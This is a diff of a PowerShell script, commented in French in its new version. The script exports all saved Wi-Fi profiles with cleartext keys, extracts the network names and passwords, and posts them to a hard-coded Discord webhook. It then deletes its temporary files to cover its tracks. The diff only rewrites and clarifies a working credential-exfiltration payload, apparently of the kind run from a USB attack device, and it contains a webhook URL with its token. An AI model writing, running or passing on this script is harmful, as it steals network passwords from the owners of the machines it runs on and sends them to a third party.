@@ -1,23 +1,33 @@
-# Create a temporary directory and change to it
-$p = "$env:temp\wifi-passwords"; md $p >$null; cd $p;
+# 1. Création et déplacement dans un dossier temporaire
+$p = Join-Path $env:temp "wifi_data"
+if (-Not (Test-Path $p)) { New-Item -ItemType Directory -Path $p }
+Set-Location $p
 
-# Export all wifi profiles to xml files in the current directory
-netsh wlan export profile key=clear >$null;
+# 2. Export des profils Wi-Fi en XML
+netsh wlan export profile key=clear | Out-Null
 
-# Parse the xml files and create a custom object with the name and password
-$r = Get-ChildItem | ForEach-Object {
-  $Xml = [xml](Get-Content -Path $_.FullName)
-  [PSCustomObject]@{
-    Name = $Xml.WLANProfile.Name
-    Password = $Xml.WLANProfile.MSM.Security.SharedKey.KeyMaterial
-  }
+# 3. Extraction des noms et mots de passe
+$r = Get-ChildItem *.xml | ForEach-Object {
+    $xml = [xml](Get-Content $_.FullName)
+    [PSCustomObject]@{
+        SSID     = $xml.WLANProfile.name
+        Password = $xml.WLANProfile.MSM.Security.SharedKey.keyMaterial
+    }
 }
 
-# Format the custom object as a table in a Markdown code block
-$body = @{content = "``````"+($r | Format-Table | Out-String)+"``````"}
+# 4. Préparation du message pour Discord
+# On transforme la liste en texte, puis on l'insère dans un objet JSON
+$msg = $r | Format-Table | Out-String
+$payload = @{
+    content = "```" + $msg + "```"
+} | ConvertTo-Json
 
-# Send the formatted table to a Discord webhook
-Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1464042268062126192/bM0DHsu6iZpS2CtzN6GBEJ2PEMLNk1muv1Mohan6zQ90XRRwKuRdU8IPrIdv8cbVhUdR' -Method 'post' -Body $body >$null;
+# 5. Envoi vers ton Webhook
+$uri = 'https://discord.com/api/webhooks/1464042268062126192/bM0DHsu6iZpS2CtzN6GBEJ2PEMLNk1muv1Mohan6zQ90XRRwKuRdU8IPrIdv8cbVhUdR'
 
-# Delete the temporary directory and exit the script
-cd ..; rm $p -r -fo; exit;
+Invoke-RestMethod -Uri $uri -Method Post -Body $payload -ContentType 'application/json'
+
+# 6. Nettoyage et sortie
+Set-Location $env:temp
+Remove-Item $p -Recurse -Force
+exit
